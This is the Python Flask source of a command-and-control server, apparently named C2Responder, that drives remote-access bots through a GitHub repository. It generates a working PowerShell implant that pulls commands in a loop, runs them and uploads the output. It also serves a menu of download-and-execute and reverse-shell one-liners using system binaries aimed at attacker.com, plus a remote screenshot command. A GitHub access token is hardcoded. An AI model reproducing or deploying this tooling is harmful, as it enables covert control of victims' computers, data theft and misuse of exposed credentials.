from flask import Flask, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from bson import ObjectId
import uuid
import requests
import base64
import json
import datetime

app = Flask(__name__)
CORS(app, origins="*")  # Allow all origins

# Connect to MongoDB (default localhost:27017)
client = MongoClient("mongodb://localhost:27017/")
db = client["C2Responder"]          # Database
configs = db["configs"]             # Collection

def clean_doc(doc):
    """Convert ObjectId to str recursively in a doc"""
    if isinstance(doc, list):
        return [clean_doc(d) for d in doc]
    if isinstance(doc, dict):
        return {k: clean_doc(v) for k, v in doc.items()}
    if isinstance(doc, ObjectId):
        return str(doc)
    return doc

@app.route("/configinput", methods=["POST"])
def config_input():
    try:
        data = request.get_json()
        print(f"Received data: {data}")
        
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        username = data.get("username", "unknown")
        timestamp = data.get("timestamp", "")
        
        # Extract all configuration fields (excluding username and timestamp)
        config_fields = {}
        for key, value in data.items():
            if key not in ["username", "timestamp"]:
                config_fields[key] = value
        
        print(f"Extracted config fields: {config_fields}")
        
        if not config_fields:
            return jsonify({"status": "error", "message": "No configuration fields found"}), 400
        
        # Check if user config already exists (single document per user)
        existing = configs.find_one({"username": username})
        
        if existing:
            # UPDATE existing document with all new config fields
            print(f"Updating existing config for user: {username}")
            result = configs.update_one(
                {"username": username},
                {"$set": {
                    **config_fields,
                    "timestamp": timestamp
                }}
            )
            action = "updated"
            doc_id = str(existing["_id"])
        else:
            # CREATE new document with all config
            print(f"Creating new config for user: {username}")
            new_doc = {
                "username": username,
                "timestamp": timestamp,
                **config_fields
            }
            result = configs.insert_one(new_doc)
            action = "created"
            doc_id = str(result.inserted_id)
        
        return jsonify({
            "status": "success",
            "message": f"Configuration {action} successfully",
            "action": action,
            "id": doc_id
        })
        
    except Exception as e:
        print(f"Error in config_input: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/config", methods=["GET"])
def get_config():
    try:
        username = request.args.get("username", "admin")
        print(f"Getting config for username: {username}")
        
        # Get the single configuration document for the user
        user_config = configs.find_one({"username": username})
        
        if not user_config:
            print(f"No config found for user: {username}")
            return jsonify({
                "status": "success",
                "message": "No configuration found",
                "data": {}
            })
        
        # Return all config data (excluding internal fields)
        frontend_data = {}
        for key, value in user_config.items():
            if key not in ["_id", "username", "timestamp"]:
                frontend_data[key] = value
        
        print(f"Returning config data: {frontend_data}")
        
        return jsonify({
            "status": "success",
            "message": "Configuration retrieved successfully",
            "data": frontend_data
        })
        
    except Exception as e:
        print(f"Error in get_config: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/debug/configs", methods=["GET"])
def debug_configs():
    """Debug endpoint to show all configurations in the database"""
    try:
        all_configs = list(configs.find({}))
        cleaned_configs = [clean_doc(config) for config in all_configs]
        
        return jsonify({
            "status": "success",
            "total_configs": len(cleaned_configs),
            "configs": cleaned_configs
        })
        
    except Exception as e:
        print(f"Error in debug_configs: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/delivery-formats", methods=["GET"])
def get_delivery_formats():
    """Get available LOLBin options for agent building based on platform"""
    try:
        # Get platform from query parameters
        platform = request.args.get("platform", "windows")
        
        print(f"Getting LOLBin options for platform: {platform}")
        
        # LOLBin options for each platform
        platform_lolbins = {
            "windows": [
                "PowerShell LOLBin",
                "CMD/Batch LOLBin",
                "Regsvr32 LOLBin",
                "Rundll32 LOLBin",
                "MSBuild LOLBin",
                "Certutil LOLBin",
                "Wmic LOLBin",
                "Bcdedit LOLBin"
            ],
            "linux": [
                "Bash LOLBin",
                "Curl/Wget LOLBin",
                "Python LOLBin",
                "Perl LOLBin",
                "Awk LOLBin",
                "Sed LOLBin",
                "Netcat LOLBin",
                "SSH LOLBin"
            ],
            "macos": [
                "Bash/Zsh LOLBin",
                "Curl LOLBin",
                "Python LOLBin",
                "Ruby LOLBin",
                "Swift LOLBin",
                "JXA LOLBin",
                "Osascript LOLBin",
                "Launchctl LOLBin"
            ],
            "android": [
                "Termux LOLBin",
                "Wget LOLBin",
                "Python LOLBin",
                "Busybox LOLBin",
                "ADB LOLBin",
                "Fastboot LOLBin"
            ]
        }
        
        # Get GitHub configuration for dynamic command generation
        username = request.args.get("username", "admin")
        user_config = configs.find_one({"username": username})
        
        if user_config:
            github_username = user_config.get("github_username", "HackWidMaddy")
            github_repo = user_config.get("github_repo", "C2Responder")
            github_pat = user_config.get("github_pat", "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")
        else:
            # Fallback values
            github_username = "HackWidMaddy"
            github_repo = "C2Responder"
            github_pat = "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"
        
        # Generate a UUID for this request
        bot_uuid = str(uuid.uuid4())
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        print(f"Creating GitHub files for bot UUID: {bot_uuid}")
        print(f"GitHub config - Username: {github_username}, Repo: {github_repo}")
        
        # First, check if repository exists and we have access
        repo_url = f"https://api.github.com/repos/{github_username}/{github_repo}"
        repo_response = requests.get(repo_url, headers=headers)
        print(f"Repository check response: {repo_response.status_code}")
        
        if repo_response.status_code != 200:
            print(f"Repository access failed: {repo_response.status_code} - {repo_response.text}")
            return jsonify({"status": "error", "message": f"Repository access failed: {repo_response.status_code}"}), 500
        
        # Create commands and results files in GitHub
        commands_content = f"# Commands for bot {bot_uuid}\n# Created at {datetime.datetime.now().isoformat()}"
        results_content = f"# Results for bot {bot_uuid}\n# Created at {datetime.datetime.now().isoformat()}"
        
        # Create commands file
        commands_data = {
            "message": f"Create commands file for bot {bot_uuid}",
            "content": base64.b64encode(commands_content.encode()).decode(),
            "path": f"commands/{bot_uuid}.txt"
        }
        
        commands_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/commands/{bot_uuid}.txt"
        print(f"Creating commands file at: {commands_url}")
        commands_response = requests.put(commands_url, headers=headers, json=commands_data)
        
        print(f"Commands file response: {commands_response.status_code}")
        print(f"Commands file response text: {commands_response.text}")
        
        if commands_response.status_code not in [201, 200]:
            print(f"Failed to create commands file: {commands_response.status_code} - {commands_response.text}")
            return jsonify({"status": "error", "message": f"Failed to create commands file: {commands_response.status_code}"}), 500
        
        # Create results file
        results_data = {
            "message": f"Create results file for bot {bot_uuid}",
            "content": base64.b64encode(results_content.encode()).decode(),
            "path": f"results/{bot_uuid}.txt"
        }
        
        results_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/results/{bot_uuid}.txt"
        print(f"Creating results file at: {results_url}")
        results_response = requests.put(results_url, headers=headers, json=results_data)
        
        print(f"Results file response: {results_response.status_code}")
        print(f"Results file response text: {results_response.text}")
        
        if results_response.status_code not in [201, 200]:
            print(f"Failed to create results file: {results_response.status_code} - {results_response.text}")
            return jsonify({"status": "error", "message": f"Failed to create results file: {results_response.status_code}"}), 500
        
        # Store bot information in MongoDB bots collection
        bot_data = {
            "uuid": bot_uuid,
            "username": username,
            "platform": platform,
            "github_username": github_username,
            "github_repo": github_repo,
            "commands_file": f"commands/{bot_uuid}.txt",
            "results_file": f"results/{bot_uuid}.txt",
            "created_at": datetime.datetime.now().isoformat(),
            "status": "active",
            "last_seen": None,
            "capabilities": [],
            "transport_channel": "github"
        }
        
        # Create bots collection if it doesn't exist
        bots = db["bots"]
        bot_result = bots.insert_one(bot_data)
        
        print(f"Bot created successfully with UUID: {bot_uuid}")
        print(f"Bot stored in MongoDB with ID: {bot_result.inserted_id}")
        
        # Generate the dynamic PowerShell command with infinite loop and SHA handling
        dynamic_powershell_command = f'$RepoOwner="{github_username}";$RepoName="{github_repo}";$BotID="{bot_uuid}";$PAT="{github_pat}";$AuthHeader=@{{Authorization="token $PAT"}};$CmdUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/commands/$BotID.txt";$ResUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/results/$BotID.txt";while($true){{try{{$resp=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;$cmds=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.content)) -split "`n";$cmdSha=$resp.sha}}catch{{$cmds=@();$cmdSha=$null}};$results=@();foreach($c in $cmds){{if(-not [string]::IsNullOrWhiteSpace($c)){{try{{$results+=(&([ScriptBlock]::Create($c)) | Out-String)}}catch{{$results+=$_.Exception.Message}}}}}};$resultContent=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($results -join "`n")));try{{$existing=Invoke-RestMethod -Uri $ResUrl -Headers $AuthHeader;$sha=$existing.sha}}catch{{$sha=$null}};$putBody=@{{message="Update $BotID results";content=$resultContent}};if($sha){{$putBody.sha=$sha}};try{{Invoke-RestMethod -Uri $ResUrl -Method Put -Headers $AuthHeader -Body ($putBody|ConvertTo-Json)}}catch{{Write-Host "Results update failed: $($_.Exception.Message)"}};if($cmdSha){{$clearBody=@{{message="Clear $BotID commands";content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(""));sha=$cmdSha}};try{{Invoke-RestMethod -Uri $CmdUrl -Method Put -Headers $AuthHeader -Body ($clearBody|ConvertTo-Json)}}catch{{Write-Host "Commands clear failed: $($_.Exception.Message)"}}}};Start-Sleep -Seconds 5}}'
        
        # LOLBin commands for each platform
        lolbin_commands = {
            "windows": {
                "PowerShell LOLBin": dynamic_powershell_command,
                "CMD/Batch LOLBin": f"cmd /c \"{dynamic_powershell_command}\"",
                "Regsvr32 LOLBin": f"regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll",
                "Rundll32 LOLBin": f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document=\\..\\mshtml,RunHTMLApplication\";document=document.createElement('script');document.body.appendChild(document.createElement('script')).src='http://attacker.com/payload.js';",
                "MSBuild LOLBin": f"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe http://attacker.com/payload.xml",
                "Certutil LOLBin": f"certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe",
                "Wmic LOLBin": f"wmic process call create \"cmd.exe /c {dynamic_powershell_command}\"",
                "Bcdedit LOLBin": f"bcdedit /set {{default}} bootmenupolicy legacy && bcdedit /set {{default}} bootstatuspolicy ignoreallfailures"
            },
            "linux": {
                "Bash LOLBin": "bash -c \"curl -s http://attacker.com/payload.sh | bash\"",
                "Curl/Wget LOLBin": "curl -s http://attacker.com/payload.sh | bash",
                "Python LOLBin": "python -c \"import urllib2; exec(urllib2.urlopen('http://attacker.com/payload.py').read())\"",
                "Perl LOLBin": "perl -e \"use LWP::Simple; eval get('http://attacker.com/payload.pl')\"",
                "Awk LOLBin": "awk 'BEGIN {system(\"curl -s http://attacker.com/payload.sh | bash\")}'",
                "Sed LOLBin": "sed 's/.*/curl -s http:\/\/attacker.com\/payload.sh | bash/' /dev/null | bash",
                "Netcat LOLBin": "nc attacker.com 4444 -e /bin/bash",
                "SSH LOLBin": "ssh -o ProxyCommand=\"nc -X connect -x attacker.com:8080 %h %p\" user@target.com"
            },
            "macos": {
                "Bash/Zsh LOLBin": "bash -c \"curl -s http://attacker.com/payload.sh | bash\"",
                "Curl LOLBin": "curl -s http://attacker.com/payload.sh | bash",
                "Python LOLBin": "python -c \"import urllib2; exec(urllib2.urlopen('http://attacker.com/payload.py').read())\"",
                "Ruby LOLBin": "ruby -e \"eval(open('http://attacker.com/payload.rb').read)\"",
                "Swift LOLBin": "swift -e \"import Foundation; let url = URL(string: \\\"http://attacker.com/payload.swift\\\")!; let data = try Data(contentsOf: url); eval(String(data: data, encoding: .utf8)!)\"",
                "JXA LOLBin": "osascript -l JavaScript -e \"eval(ObjC.unwrap(NSString.alloc().initWithContentsOfURL(NSURL.URLWithString('http://attacker.com/payload.js'))))\"",
                "Osascript LOLBin": "osascript -e \"do shell script \\\"curl -s http://attacker.com/payload.sh | bash\\\"\"",
                "Launchctl LOLBin": "launchctl submit -l com.attacker.payload -- /bin/bash -c \"curl -s http://attacker.com/payload.sh | bash\""
            },
            "android": {
                "Termux LOLBin": "termux-exec bash -c \"curl -s http://attacker.com/payload.sh | bash\"",
                "Wget LOLBin": "wget -qO- http://attacker.com/payload.sh | sh",
                "Python LOLBin": "python -c \"import urllib2; exec(urllib2.urlopen('http://attacker.com/payload.py').read())\"",
                "Busybox LOLBin": "busybox wget -qO- http://attacker.com/payload.sh | sh",
                "ADB LOLBin": "adb shell \"curl -s http://attacker.com/payload.sh | sh\"",
                "Fastboot LOLBin": "fastboot oem exec \"curl -s http://attacker.com/payload.sh | sh\""
            }
        }
        
        # Get LOLBin options for the selected platform
        lolbin_options = platform_lolbins.get(platform, [])
        platform_commands = lolbin_commands.get(platform, {})
        
        print(f"Returning {len(lolbin_options)} LOLBin options for {platform}")
        
        return jsonify({
            "status": "success",
            "message": f"LOLBin options retrieved successfully for {platform}",
            "formats": lolbin_options,
            "total_formats": len(lolbin_options),
            "platform": platform,
            "lolbin_commands": platform_commands
        })
        
    except Exception as e:
        print(f"Error in get_delivery_formats: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/create-agent", methods=["POST"])
def create_agent():
    """Create a new agent with UUID and GitHub integration"""
    try:
        data = request.get_json()
        print(f"Creating agent with data: {data}")
        
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        platform = data.get("platform", "windows")
        transport_channel = data.get("transport_channel", "github")
        lolbin_format = data.get("lolbin_format", "PowerShell LOLBin")
        username = data.get("username", "admin")
        
        # Generate UUID for the agent
        agent_uuid = str(uuid.uuid4())
        print(f"Generated UUID: {agent_uuid}")
        
        # Get GitHub configuration from MongoDB
        user_config = configs.find_one({"username": username})
        if not user_config:
            return jsonify({"status": "error", "message": "User configuration not found"}), 404
        
        github_pat = user_config.get("github_pat")
        github_username = user_config.get("github_username")
        github_repo = user_config.get("github_repo")
        
        if not all([github_pat, github_username, github_repo]):
            return jsonify({"status": "error", "message": "GitHub configuration incomplete"}), 400
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        print(f"GitHub config - Username: {github_username}, Repo: {github_repo}")
        print(f"Using PAT: {github_pat[:10]}...")
        
        # First, check if repository exists and we have access
        repo_url = f"https://api.github.com/repos/{github_username}/{github_repo}"
        repo_response = requests.get(repo_url, headers=headers)
        print(f"Repository check response: {repo_response.status_code}")
        
        if repo_response.status_code != 200:
            print(f"Repository access failed: {repo_response.status_code} - {repo_response.text}")
            return jsonify({"status": "error", "message": f"Repository access failed: {repo_response.status_code}"}), 500
        
        # Create commands and results files in GitHub
        commands_content = f"# Commands for agent {agent_uuid}\n# Created at {datetime.datetime.now().isoformat()}"
        results_content = f"# Results for agent {agent_uuid}\n# Created at {datetime.datetime.now().isoformat()}"
        
        # Create commands file
        commands_data = {
            "message": f"Create commands file for agent {agent_uuid}",
            "content": base64.b64encode(commands_content.encode()).decode(),
            "path": f"commands/{agent_uuid}.txt"
        }
        
        commands_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/commands/{agent_uuid}.txt"
        print(f"Creating commands file at: {commands_url}")
        commands_response = requests.put(commands_url, headers=headers, json=commands_data)
        
        print(f"Commands file response: {commands_response.status_code}")
        print(f"Commands file response text: {commands_response.text}")
        
        if commands_response.status_code not in [201, 200]:
            print(f"Failed to create commands file: {commands_response.status_code} - {commands_response.text}")
            return jsonify({"status": "error", "message": f"Failed to create commands file: {commands_response.status_code}"}), 500
        
        # Create results file
        results_data = {
            "message": f"Create results file for agent {agent_uuid}",
            "content": base64.b64encode(results_content.encode()).decode(),
            "path": f"results/{agent_uuid}.txt"
        }
        
        results_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/results/{agent_uuid}.txt"
        print(f"Creating results file at: {results_url}")
        results_response = requests.put(results_url, headers=headers, json=results_data)
        
        print(f"Results file response: {results_response.status_code}")
        print(f"Results file response text: {results_response.text}")
        
        if results_response.status_code not in [201, 200]:
            print(f"Failed to create results file: {results_response.status_code} - {results_response.text}")
            return jsonify({"status": "error", "message": f"Failed to create results file: {results_response.status_code}"}), 500
        
        # Generate PowerShell command with the new UUID using the specific format with infinite loop and SHA handling
        powershell_command = f'$RepoOwner="{github_username}";$RepoName="{github_repo}";$BotID="{agent_uuid}";$PAT="{github_pat}";$AuthHeader=@{{Authorization="token $PAT"}};$CmdUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/commands/$BotID.txt";$ResUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/results/$BotID.txt";while($true){{try{{$resp=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;$cmds=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.content)) -split "`n";$cmdSha=$resp.sha}}catch{{$cmds=@();$cmdSha=$null}};$results=@();foreach($c in $cmds){{if(-not [string]::IsNullOrWhiteSpace($c)){{try{{$results+=(&([ScriptBlock]::Create($c)) | Out-String)}}catch{{$results+=$_.Exception.Message}}}}}};$resultContent=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($results -join "`n")));try{{$existing=Invoke-RestMethod -Uri $ResUrl -Headers $AuthHeader;$sha=$existing.sha}}catch{{$sha=$null}};$putBody=@{{message="Update $BotID results";content=$resultContent}};if($sha){{$putBody.sha=$sha}};try{{Invoke-RestMethod -Uri $ResUrl -Method Put -Headers $AuthHeader -Body ($putBody|ConvertTo-Json)}}catch{{Write-Host "Results update failed: $($_.Exception.Message)"}};if($cmdSha){{$clearBody=@{{message="Clear $BotID commands";content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(""));sha=$cmdSha}};try{{Invoke-RestMethod -Uri $CmdUrl -Method Put -Headers $AuthHeader -Body ($clearBody|ConvertTo-Json)}}catch{{Write-Host "Commands clear failed: $($_.Exception.Message)"}}}};Start-Sleep -Seconds 5}}'
        
        # Store agent information in MongoDB
        agent_data = {
            "uuid": agent_uuid,
            "username": username,
            "platform": platform,
            "transport_channel": transport_channel,
            "lolbin_format": lolbin_format,
            "github_repo": github_repo,
            "commands_file": f"commands/{agent_uuid}.txt",
            "results_file": f"results/{agent_uuid}.txt",
            "created_at": datetime.datetime.now().isoformat(),
            "status": "active"
        }
        
        # Create agents collection if it doesn't exist
        agents = db["agents"]
        result = agents.insert_one(agent_data)
        
        print(f"Agent created successfully with UUID: {agent_uuid}")
        
        return jsonify({
            "status": "success",
            "message": f"Agent created successfully",
            "agent_uuid": agent_uuid,
            "platform": platform,
            "transport_channel": transport_channel,
            "lolbin_format": lolbin_format,
            "powershell_command": powershell_command,
            "github_files": {
                "commands": f"commands/{agent_uuid}.txt",
                "results": f"results/{agent_uuid}.txt"
            }
        })
        
    except Exception as e:
        print(f"Error in create_agent: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/bots", methods=["GET"])
def get_bots():
    """Get all bots for a user from MongoDB"""
    try:
        username = request.args.get("username", "admin")
        print(f"Getting bots for username: {username}")
        
        # Get bots from MongoDB
        bots = db["bots"]
        user_bots = list(bots.find({"username": username}))
        
        # Clean ObjectId fields
        cleaned_bots = []
        for bot in user_bots:
            bot["_id"] = str(bot["_id"])
            cleaned_bots.append(bot)
        
        print(f"Found {len(cleaned_bots)} bots for user {username}")
        
        return jsonify({
            "status": "success",
            "message": f"Retrieved {len(cleaned_bots)} bots successfully",
            "bots": cleaned_bots
        })
        
    except Exception as e:
        print(f"Error in get_bots: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/execute-command", methods=["POST"])
def execute_command():
    """Execute a command on a specific bot by writing to GitHub commands file"""
    try:
        data = request.get_json()
        print(f"Executing command with data: {data}")
        
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        bot_uuid = data.get("bot_uuid")
        command = data.get("command")
        username = data.get("username", "admin")
        
        if not bot_uuid or not command:
            return jsonify({"status": "error", "message": "Bot UUID and command are required"}), 400
        
        # Get bot information from MongoDB
        bots = db["bots"]
        bot = bots.find_one({"uuid": bot_uuid, "username": username})
        
        if not bot:
            return jsonify({"status": "error", "message": "Bot not found"}), 404
        
        # Get GitHub configuration
        user_config = configs.find_one({"username": username})
        if not user_config:
            return jsonify({"status": "error", "message": "User configuration not found"}), 404
        
        github_pat = user_config.get("github_pat")
        github_username = user_config.get("github_username")
        github_repo = user_config.get("github_repo")
        
        if not all([github_pat, github_username, github_repo]):
            return jsonify({"status": "error", "message": "GitHub configuration incomplete"}), 400
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # Get current commands file content
        commands_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/commands/{bot_uuid}.txt"
        commands_response = requests.get(commands_url, headers=headers)
        
        if commands_response.status_code != 200:
            return jsonify({"status": "error", "message": "Failed to access commands file"}), 500
        
        current_content = commands_response.json()
        current_sha = current_content["sha"]
        
        # Prepare new content with the command
        new_content = f"{command}\n"
        encoded_content = base64.b64encode(new_content.encode()).decode()
        
        # Update commands file
        update_data = {
            "message": f"Add command for bot {bot_uuid}",
            "content": encoded_content,
            "sha": current_sha
        }
        
        update_response = requests.put(commands_url, headers=headers, json=update_data)
        
        if update_response.status_code not in [200, 201]:
            print(f"Failed to update commands file: {update_response.status_code} - {update_response.text}")
            return jsonify({"status": "error", "message": "Failed to write command to GitHub"}), 500
        
        print(f"Command '{command}' written to GitHub for bot {bot_uuid}")
        
        return jsonify({
            "status": "success",
            "message": "Command sent successfully",
            "bot_uuid": bot_uuid,
            "command": command
        })
        
    except Exception as e:
        print(f"Error in execute_command: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/get-results", methods=["GET"])
def get_results():
    """Get results from a specific bot's results file"""
    try:
        bot_uuid = request.args.get("bot_uuid")
        username = request.args.get("username", "admin")
        
        if not bot_uuid:
            return jsonify({"status": "error", "message": "Bot UUID is required"}), 400
        
        # Get bot information from MongoDB
        bots = db["bots"]
        bot = bots.find_one({"uuid": bot_uuid, "username": username})
        
        if not bot:
            return jsonify({"status": "error", "message": "Bot not found"}), 404
        
        # Get GitHub configuration
        user_config = configs.find_one({"username": username})
        if not user_config:
            return jsonify({"status": "error", "message": "User configuration not found"}), 404
        
        github_pat = user_config.get("github_pat")
        github_username = user_config.get("github_username")
        github_repo = user_config.get("github_repo")
        
        if not all([github_pat, github_username, github_repo]):
            return jsonify({"status": "error", "message": "GitHub configuration incomplete"}), 400
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # Get results file content
        results_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/results/{bot_uuid}.txt"
        results_response = requests.get(results_url, headers=headers)
        
        if results_response.status_code != 200:
            return jsonify({"status": "error", "message": "Failed to access results file"}), 500
        
        results_content = results_response.json()
        results_data = base64.b64decode(results_content["content"]).decode()
        
        # Check if there are actual results (not just the initial content or cleared content)
        if (results_data.strip() and 
            not results_data.startswith("# Results for bot") and 
            not results_data.startswith("# Results cleared")):
            
            # Clear the results file immediately after reading
            clear_data = {
                "message": f"Clear results for bot {bot_uuid}",
                "content": base64.b64encode("# Results cleared\n".encode()).decode(),
                "sha": results_content["sha"]
            }
            
            clear_response = requests.put(results_url, headers=headers, json=clear_data)
            if clear_response.status_code not in [200, 201]:
                print(f"Warning: Failed to clear results file: {clear_response.status_code}")
            
            return jsonify({
                "status": "success",
                "message": "Results retrieved successfully",
                "results": results_data,
                "bot_uuid": bot_uuid
            })
        else:
            return jsonify({
                "status": "success",
                "message": "No new results available",
                "results": None,
                "bot_uuid": bot_uuid
            })
        
    except Exception as e:
        print(f"Error in get_results: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/screenshot", methods=["POST"])
def take_screenshot():
    """Take a screenshot of the target machine using PowerShell"""
    try:
        data = request.get_json()
        print(f"Taking screenshot with data: {data}")
        
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        bot_uuid = data.get("bot_uuid")
        username = data.get("username", "admin")
        
        if not bot_uuid:
            return jsonify({"status": "error", "message": "Bot UUID is required"}), 400
        
        # Get bot information from MongoDB
        bots = db["bots"]
        bot = bots.find_one({"uuid": bot_uuid, "username": username})
        
        if not bot:
            return jsonify({"status": "error", "message": "Bot not found"}), 404
        
        # Get GitHub configuration
        user_config = configs.find_one({"username": username})
        if not user_config:
            return jsonify({"status": "error", "message": "User configuration not found"}), 404
        
        github_pat = user_config.get("github_pat")
        github_username = user_config.get("github_username")
        github_repo = user_config.get("github_repo")
        
        if not all([github_pat, github_username, github_repo]):
            return jsonify({"status": "error", "message": "GitHub configuration incomplete"}), 400
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # PowerShell screenshot command that captures screen and returns base64
        screenshot_command = '''Add-Type -AssemblyName System.Drawing, System.Windows.Forms; $b = New-Object Drawing.Bitmap ([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); [Drawing.Graphics]::FromImage($b).CopyFromScreen([Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [Drawing.Point]::Empty, $b.Size); $ms = New-Object IO.MemoryStream; $b.Save($ms, [Drawing.Imaging.ImageFormat]::Png); [Convert]::ToBase64String($ms.ToArray())'''
        
        # Get current commands file content
        commands_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/commands/{bot_uuid}.txt"
        commands_response = requests.get(commands_url, headers=headers)
        
        if commands_response.status_code != 200:
            return jsonify({"status": "error", "message": "Failed to access commands file"}), 500
        
        current_content = commands_response.json()
        current_sha = current_content["sha"]
        
        # Prepare new content with the screenshot command
        new_content = f"{screenshot_command}\n"
        encoded_content = base64.b64encode(new_content.encode()).decode()
        
        # Update commands file
        update_data = {
            "message": f"Add screenshot command for bot {bot_uuid}",
            "content": encoded_content,
            "sha": current_sha
        }
        
        update_response = requests.put(commands_url, headers=headers, json=update_data)
        
        if update_response.status_code not in [200, 201]:
            print(f"Failed to update commands file: {update_response.status_code} - {update_response.text}")
            return jsonify({"status": "error", "message": "Failed to write screenshot command to GitHub"}), 500
        
        print(f"Screenshot command sent to bot {bot_uuid}")
        
        return jsonify({
            "status": "success",
            "message": "Screenshot command sent successfully",
            "bot_uuid": bot_uuid,
            "command": "screenshot"
        })
        
    except Exception as e:
        print(f"Error in take_screenshot: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
